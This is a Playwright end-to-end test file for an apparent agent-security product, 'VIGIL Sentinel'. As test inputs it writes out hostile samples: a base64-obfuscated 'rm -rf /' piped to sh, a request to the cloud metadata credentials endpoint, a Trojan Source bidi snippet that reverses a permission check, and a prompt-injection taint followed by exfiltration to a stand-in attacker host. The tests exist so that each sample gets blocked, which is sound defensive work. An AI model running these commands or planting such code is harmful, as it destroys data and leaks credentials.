/**
 * VIGIL Sentinel E2E Specification
 * 
 * End-to-end integration and policy verification for Sentinel Agent Security
 * under Plan.pdf specifications:
 * 1. Shell AST De-obfuscation & Dangerous Command Interception
 * 2. Cloud Metadata & SSRF Exfiltration Defense
 * 3. Trojan Source (CVE-2021-42574) & Malicious Diff Analysis
 * 4. Canary Decoy Trap & Active Honeypot
 * 5. Scoped Capability Secret Brokering (HMAC-SHA256)
 * 6. Cryptographic Merkle/SHA-256 Audit Ledger Chain
 * 7. Temporal Attack-Chain Correlation & Taint Tracking
 * 8. Autonomous Red-Team Simulation Lab (12 Attack Scenarios)
 */
const { test, expect } = require('@playwright/test');
const path = require('path');

const { SentinelPolicyEngine } = require('../src/sentinel/policy-engine.js');
const { ShellAstAnalyzer } = require('../src/sentinel/gateway/shell-ast-analyzer.js');
const { DiffAnalyzer } = require('../src/sentinel/diff/diff-analyzer.js');
const { CanaryTrapManager } = require('../src/sentinel/credentials/canary-trap-manager.js');
const { CapabilityTokenManager, SentinelSecretBroker } = require('../src/sentinel/credentials/secret-broker.js');
const { SentinelAuditLedger, GENESIS_PREV_HASH } = require('../src/sentinel/ledger/audit-ledger.js');
const { AttackChainDetector } = require('../src/sentinel/correlation/attack-chain-detector.js');
const { SentinelRedTeamLab, ATTACK_CORPUS } = require('../src/sentinel/redteam/simulation-lab.js');
const {
  EVENT_ACTION_PROPOSED,
  EVENT_POLICY_EVALUATED,
  REASON_CODES
} = require('../src/sentinel/constants.js');

test.describe('Sentinel Agent Protection E2E (Plan.pdf Specification)', () => {
  let policyEngine;
  let workspaceRoot;

  test.beforeAll(async () => {
    workspaceRoot = path.resolve(__dirname, '..');
    policyEngine = new SentinelPolicyEngine({
      workspaceRoot,
      activeProfile: 'balanced'
    });
  });

  test('E2E Sentinel: Shell AST de-obfuscation blocks base64 piped destructive commands', async () => {
    const analyzer = new ShellAstAnalyzer();
    const payload = 'echo cm0gLXJmIC8= | base64 -d | sh';
    const result = analyzer.analyze(payload);

    expect(result.isDestructive).toBe(true);
    expect(result.isSafe).toBe(false);
    expect(result.reasonCode).toBe('DENY_UNSAFE_SHELL_COMMAND');
    expect(result.decodedPipelines).toContain('rm -rf /');
  });

  test('E2E Sentinel: Cloud metadata SSRF exfiltration is blocked fail-closed', async () => {
    const action = {
      schema_version: '1.0.0',
      request_id: 'e2e_ssrf_001',
      session_id: 'session_e2e',
      agent_id: 'agent_cursor',
      adapter: { id: 'mcp-adapter', type: 'mcp', version: '1.0.0' },
      action_type: 'net:request',
      resource: 'http://169.254.169.254/latest/meta-data/iam/security-credentials/',
      timestamp: new Date().toISOString()
    };

    const decision = await policyEngine.evaluate(action);
    expect(decision.decision).toBe('deny');
    expect(decision.reason_code).toBe(REASON_CODES.DENY_CLOUD_METADATA_BLOCKED);
  });

  test('E2E Sentinel: Trojan Source Unicode bidi characters in code diff are blocked', async () => {
    const analyzer = new DiffAnalyzer();
    const maliciousCode = '/* Check permissions: \u202E } return true; // \u202D */\nreturn false;';
    const result = analyzer.analyze({
      filePath: 'src/perm.js',
      oldContent: 'return false;',
      newContent: maliciousCode
    });

    expect(result.isSafe).toBe(false);
    expect(result.hasTrojanSource).toBe(true);
    expect(result.reasonCode).toBe(REASON_CODES.DENY_TROJAN_SOURCE_UNICODE);
    expect(result.detectedUnicodeAnomalies).toContain('U+202E');
  });

  test('E2E Sentinel: Canary trap honeypot generates high-entropy decoy credentials', async () => {
    const canaryManager = new CanaryTrapManager();
    const canaries = canaryManager.getCanaryEnvironment();

    expect(canaries.VIGIL_CANARY_AWS_KEY).toBeDefined();
    expect(canaries.VIGIL_CANARY_AWS_KEY).toMatch(/^AKIA_CANARY_[A-F0-9]{16}$/);
    expect(canaries.VIGIL_CANARY_GITHUB_PAT).toMatch(/^ghp_CanaryDecoy[A-Za-z0-9]{20}$/);
    expect(canaryManager.getCanaryFilePaths()).toContain('.env.canary');
  });

  test('E2E Sentinel: Secret broker enforces HMAC-SHA256 capability tokens', async () => {
    const tokenManager = new CapabilityTokenManager({
      signingKey: 'test-signing-key-0123456789abcdef0123456789abcdef',
      defaultTtlSecs: 60
    });
    const broker = new SentinelSecretBroker({ tokenManager });
    broker.registerSecret('github-api', 'ghp_secrettoken9876543210', ['api.github.com:read']);

    const minted = tokenManager.mintToken({
      agentId: 'agent-claude-01',
      sessionId: 'sess-01',
      secretId: 'github-api',
      scopes: ['api.github.com:read']
    });

    expect(minted.tokenString).toBeDefined();
    expect(minted.tokenId).toBeDefined();
    expect(minted.expiresAt).toBeGreaterThan(Date.now() / 1000);
  });

  test('E2E Sentinel: Cryptographic SHA-256 audit ledger verifies unbroken hash chain', async () => {
    const ledger = new SentinelAuditLedger({ maxInMemoryEntries: 1000 });
    expect(ledger.headHash).toBe(GENESIS_PREV_HASH);

    const entry0 = ledger.append(EVENT_ACTION_PROPOSED, { action: 'fs:read' });
    const entry1 = ledger.append(EVENT_POLICY_EVALUATED, { decision: 'allow' });

    expect(entry1.prev_hash).toBe(entry0.entry_hash);
    const integrityCheck = ledger.verifyLedgerIntegrity();
    expect(integrityCheck.valid).toBe(true);
    expect(integrityCheck.checkedEntries).toBe(2);
  });

  test('E2E Sentinel: Temporal attack chain detector blocks exfiltration on tainted session', async () => {
    const detector = new AttackChainDetector({ windowMs: 60000 });
    const engineWithCorrelation = new SentinelPolicyEngine({
      workspaceRoot,
      activeProfile: 'balanced',
      correlationDetector: detector
    });

    const sessionId = 'session-taint-e2e';
    // Step 1: Ingestion of prompt injection
    detector.recordSignal(sessionId, 'INJECTION_DETECTED', {
      source: 'untrusted_issue',
      pattern: 'EXFILTRATE_SECRETS'
    });

    // Step 2: Agent reads sensitive workspace file
    const readAction = {
      schema_version: '1.0.0',
      request_id: 'req-chain-read',
      session_id: sessionId,
      agent_id: 'agent-autonomous',
      adapter: { id: 'mcp-adapter', version: '1.0.0', type: 'mcp' },
      action_type: 'fs:read',
      resource: 'README.md',
      timestamp: Date.now()
    };
    await engineWithCorrelation.evaluate(readAction);

    // Step 3: Outbound egress -> blocked by attack chain detector!
    const outboundAction = {
      schema_version: '1.0.0',
      request_id: 'req-chain-e2e',
      session_id: sessionId,
      agent_id: 'agent-autonomous',
      adapter: { id: 'mcp-adapter', version: '1.0.0', type: 'mcp' },
      action_type: 'net:request',
      resource: 'https://attacker-c2.example.com/exfil',
      timestamp: Date.now()
    };

    const decision = await engineWithCorrelation.evaluate(outboundAction);
    expect(decision.decision).toBe('deny');
    expect(decision.reason_code).toBe(REASON_CODES.DENY_ATTACK_CHAIN_EXFILTRATION);
  });

  test('E2E Sentinel: Simulation lab achieves 100% block rate on 12 attack vectors', async () => {
    const lab = new SentinelRedTeamLab({ workspaceRoot, policyEngine });
    const report = await lab.evaluateAdversarialCorpus();

    expect(report.totalScenarios).toBe(ATTACK_CORPUS.length);
    expect(report.blockedCount).toBe(ATTACK_CORPUS.length);
    expect(report.bypassedCount).toBe(0);
    expect(report.interceptionRate).toBe(100); // 100% block rate
    expect(report.allIntercepted).toBe(true);
  });
});
